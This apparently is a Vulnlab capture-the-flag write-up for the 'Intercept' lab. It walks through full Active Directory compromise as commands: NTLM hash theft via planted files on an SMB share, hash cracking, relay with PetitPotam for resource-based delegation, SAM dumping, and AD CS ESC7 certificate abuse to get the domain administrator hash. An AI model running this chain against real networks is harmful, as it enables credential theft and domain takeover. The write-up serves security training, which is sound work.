# Vulnlab - Intercept

# NMAP

## DC01.intercept.vl

```bash
PORT      STATE SERVICE    REASON          VERSION   
53/tcp    open  tcpwrapped syn-ack ttl 127       
135/tcp   open  tcpwrapped syn-ack ttl 127
139/tcp   open  tcpwrapped syn-ack ttl 127   
389/tcp   open  tcpwrapped syn-ack ttl 127   
|_ssl-date: TLS randomness does not represent time   
| ssl-cert: Subject: commonName=DC01.intercept.vl
445/tcp   open  tcpwrapped syn-ack ttl 127     
3268/tcp  open  tcpwrapped syn-ack ttl 127   
3389/tcp  open  tcpwrapped syn-ack ttl 127                         
49664/tcp open  tcpwrapped syn-ack ttl 127  
54368/tcp open  tcpwrapped syn-ack ttl 127      
55463/tcp open  tcpwrapped syn-ack ttl 127
```

## WS01.intercept.vl

```bash
PORT     STATE SERVICE    REASON          VERSION
135/tcp  open  tcpwrapped syn-ack ttl 127      
139/tcp  open  tcpwrapped syn-ack ttl 127
445/tcp  open  tcpwrapped syn-ack ttl 127
3389/tcp open  tcpwrapped syn-ack ttl 127
| ssl-cert: Subject: commonName=WS01.intercept.vl
| Issuer: commonName=WS01.intercept.vl
| Public Key type: rsa               
| Public Key bits: 2048
```

Enumerating the smb shares, we have `dev` and `Users` share on `WS01`

<img src="https://i.imgur.com/AakmITa.png"/>

We can access the dev share with null authentication which has readme stating about checking this share

<img src="https://i.imgur.com/7JFgnJl.png"/>

<img src="https://i.imgur.com/gOf0fzo.png"/>

From the `tools` folder, it has `Autologon64.exe`

<img src="https://i.imgur.com/LdRhBQE.png"/>

So this tells us that a user will constantly look into this folder, we can try coercing NTLM authentication, to do that we can try placing scf, url, lnk and other files that will have UNC path to our IP, we can utilize https://github.com/Greenwolf/ntlm_theft that can help us in generate files rather than spending time and doing it manually 

```bash
python3 ./ntlm_theft.py -s 10.8.0.136 --generate all --filename @
```

<img src="https://i.imgur.com/1d1nrjd.png"/>

With `prompt off` and `mput *` we can upload all of these files on dev smb share

<img src="https://i.imgur.com/so1Nj1h.png"/>

As soon as these files will be uploaded, we'll get NTLMv2 hash of `Kathryn.Spencer` on `Responder`

<img src="https://i.imgur.com/RJVx4nI.png"/>

We can try cracking it but before that let's see if we can realy it on DC01 by checking if smb singing is disabled

<img src="https://i.imgur.com/lixXvjv.png"/>

Smb signing is enabled so we can't relay it and the only option we have here is to crack this hash, using `hashcat` we'll be able to crack this hash with the password `Chocolate1`

```bash
hashcat -a 0 -m 5600 ./hash.txt /usr/share/wordlists/rockyou.txt
```

<img src="https://i.imgur.com/MSTbMJt.png"/>

We can verify if we have a domain user

<img src="https://i.imgur.com/cXbvapQ.png"/>

So now we can enumerate the domain with `python-bloodhound`

```bash
python3 /opt/BloodHound.py-Kerberos/bloodhound.py -d 'intercept.vl' -u 'KATHRYN.SPENCER' -p 'Chocolate1' -gc 'DC01.intercept.vl' -c all -ns 10.10.240.133
```

<img src="https://i.imgur.com/8XnTeZS.png"/>

From bloodhuond, we only see this user to be a part of `intercept-users` group

<img src="https://i.imgur.com/PD6yCD9.png"/>

We can try spraying the password on other domain users by retrieving the usernames from LDAP using `windapsearch`

```bash
windapsearch -u 'KATHRYN.SPENCER' -p 'Chocolate1' -d 'intercept.vl' -m users --dc 10.10.240.133 | grep sAMAccountName | awk -F: '{ print $2 }' | awk '{ gsub(/ /,""); print }'
```

<img src="https://i.imgur.com/G0RuW12.png"/>

But this password didn't worked with any other user

<img src="https://i.imgur.com/Yt7mt5L.png"/>

Taking a hint from the vulnlab wiki, it mentions about looking into LDAP singing and WebClient service, we can check these if they are enabled  with the help of crackmapexec

<img src="https://i.imgur.com/Sjqx7XL.png"/>

## Performing RBCD to get Administrator (WS01)

WebClient (WebDAV) service is enabled on WS01, which can be abused to coerce authentication combined with `PetitPotam`, we'll coerce WS01 to authenticate on DC01, since LDAP singing is disabled, this can be relayed with `ntlmrealyx` through LDAP, we can add a machine account with delegation privileges to WS01 meaning that we can perform `resource based delegation (RBCD)` (https://www.r-tec.net/r-tec-blog-resource-based-constrained-delegation.html) on WS01 and impersonate as administrator

<img src="https://i.imgur.com/xlDFha1.png"/>

But the issue is to retrieve the coerced authentication, the host needs to be in an intranet zone, must be a domain joined machine or create a valid DNS entry,  

Starting `responder` with HTTP set to off and note down the hostname it generates for us 

<img src="https://i.imgur.com/UO1vttC.png"/>

<img src="https://i.imgur.com/Hk7XmWA.png"/>

Adding DNS entry for this hostname with `dnstool.py` https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py

```bash
python3 dnstool.py -u 'intercept.vl\KATHRYN.SPENCER' -p Chocolate1 --action add --record WIN-6U9AIDU8LOC.intercept.vl --data 10.8.0.136 --type A 10.10.172.149
```

<img src="https://i.imgur.com/bFFD5qK.png"/>

Running ntlmrealyx with `--delegate-access` on DC01

```bash
ntlmrelayx.py -t ldaps://10.10.172.149 --delegate-access -smb2support
```

<img src="https://i.imgur.com/LaWbtGG.png"/>

And finally we are going to run `petitpotam.py` on WS01

```bash
python3 petitpotam.py -d "intercept.vl" -u "KATHRYN.SPENCER" -p "Chocolate1" WIN-6U9AIDU8LOC@80/randomfile.txt 10.10.172.150
```

<img src="https://i.imgur.com/Phtz3ZS.png"/>

From the output of ntlmrelayx, we'll see a machine account will be created with delegation rights to impersonate any users on WS01

<img src="https://i.imgur.com/fOi0LAR.png"/>

We can verify this by checking the attributes of WS01 with `rbcd.py`

<img src="https://i.imgur.com/x7E3nl6.png"/>

So now with `getST.py` we can request a TGT for administrator user on WS01 

```bash
getST.py -spn 'cifs/WS01.intercept.vl' -impersonate Administrator -dc-ip 10.10.172.149 'intercept/JELZDXBK$':'k)^g,*no2IwtvZY'
```

<img src="https://i.imgur.com/H0XNUme.png"/>
Dumping SAM hashes with `secretsdump.py`

```bash
secretsdump.py administrator@WS01.intercept.vl -k -no-pass
```

<img src="https://i.imgur.com/MXd07iG.png"/>

From the output we'll get another domain user's credentials `simon.bowen`, from bloodhound, this user has `GenericAll` on `ca-managers` group

<img src="https://i.imgur.com/Q5185O9.png"/>

```bash
certipy find -u 'Simon.Bowen' -p 'b0OI_fHO859+Aw' -vulnerable -stdout -dc-ip 10.10.172.149
```

Running `certipy` to check what access rights the groups have on certificates

<img src="https://i.imgur.com/uXEruYM.png"/>
Here ca-managers group has `ManageCa` permission which allows to change CA's settings to enable `Subject Alternative Name` (SAN) on all certificate templates which allows users to request a certificate for any domain user by enabling `EDITF_ATTRIBUTESUBJECTALTNAME2` property which is dubbed as `ESC7` (https://www.tarlogic.com/blog/ad-cs-esc7-attack/)

Checking if SAN is enabled

<img src="https://i.imgur.com/7Dtzexg.png"/>

We need to add Simon in ca-managers group, this can be done by first becoming the owner of the group and giving full control to Simon and then adding him into the group, for that we can use `owneredit.py`  and`dacledit.py` and we need to use the old version of impacket so enabling python virtual environment

<img src="https://i.imgur.com/aWTbRoY.png"/>
For using dacledit.py

```bash
git clone --branch dacledit https://github.com/ShutdownRepo/impacket.git
```

<img src="https://i.imgur.com/kwHI5YH.png"/>

Also we can just copy owneredit.py https://github.com/ShutdownRepo/impacket/blob/owneredit/examples/owneredit.py

```bash
python3 ./owneredit.py -action write -target 'ca-managers' -new-owner 'Simon.Bowen' 'intercept.vl'/'Simon.Bowen':'b0OI_fHO859+Aw' -dc-ip 10.10.172.149
```

<img src="https://i.imgur.com/1BULwor.png"/>

Now giving full control over ca-mangers object

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'Simon.Bowen' -target 'ca-managers' 'intercept.vl'/'Simon.Bowen':'b0OI_fHO859+Aw' -dc-ip 10.10.172.149
```

<img src="https://i.imgur.com/kZZ2oVI.png"/>

Adding Simon into ca-managers group with `net rpc`

```bash
net rpc group addmem 'ca-managers' 'Simon.Bowen' -U intercept.vl/Simon.Bowen -S DC01.intercept.vl
```

<img src="https://i.imgur.com/TN432ri.png"/>

To verify if simon is in the ca-managers group, we can re run python bloodhound and see the data from there

<img src="https://i.imgur.com/vV6Rody.png"/>

Moving back to certipy, we're going to make Simon a `ca-office` which is basically granting  `manage certificates` rights to validate the failed request

```bash
certipy ca -ca 'INTERCEPT-DC01-CA' -add-officer 'Simon.Bowen' -u 'Simon.Bowen@intercept.vl' -p 'b0OI_fHO859+Aw' -dc-ip 10.10.172.149
```

<img src="https://i.imgur.com/MbcciuZ.png"/>

Now to list the certificate templates, to check if `SubCA` is enabled

```bash
certipy ca -u "Simon.Bowen@intercept.vl" -p "b0OI_fHO859+Aw" -dc-ip "10.10.172.149" -ca 'INTERCEPT-DC01-CA' -list-templates
```

<img src="https://i.imgur.com/vNab7Pm.png"/>
Requesting a certificate for administrator using SubCA template, it will be denied but still we'll be able to save the private key

```bash
certipy req -u 'Simon.Bowen@intercept.vl' -p 'b0OI_fHO859+Aw' -ca INTERCEPT-DC01-CA -dc-ip 10.10.172.149 -template SubCA -upn administrator@intercept.vl
```

<img src="https://i.imgur.com/hz23PhW.png"/>

Having the manage certificates rights, we can validate the failed request since we have the key

```bash
certipy ca -ca 'INTERCEPT-DC01-CA' -issue-request 3 -u 'Simon.Bowen@intercept.vl' -p 'b0OI_fHO859+Aw' -dc-ip 10.10.172.149
```

<img src="https://i.imgur.com/ychLRMK.png"/>

And then retrieving the administrator's certificate

```bash
certipy req -ca 'INTERCEPT-DC01-CA' -retrieve 3 -u 'Simon.Bowen@intercept.vl' -p 'b0OI_fHO859+Aw' -dc-ip 10.10.172.149
```

<img src="https://i.imgur.com/j8dy7OA.png"/>

All that is left is to retrieve the NThash with the certificate

```bash
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'intercept.vl' -dc-ip 10.10.172.149
```

<img src="https://i.imgur.com/ZWpSkqy.png"/>
We can just login through WinRM on DC01

<img src="https://i.imgur.com/rDSo6wT.png"/>

# References

- https://github.com/Greenwolf/ntlm_theft
- https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient
- https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/
- https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
- https://www.r-tec.net/r-tec-blog-resource-based-constrained-delegation.html
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- https://www.tarlogic.com/blog/ad-cs-esc7-attack/
- https://github.com/ShutdownRepo/impacket
- https://github.com/ShutdownRepo/impacket/blob/owneredit/examples/owneredit.py
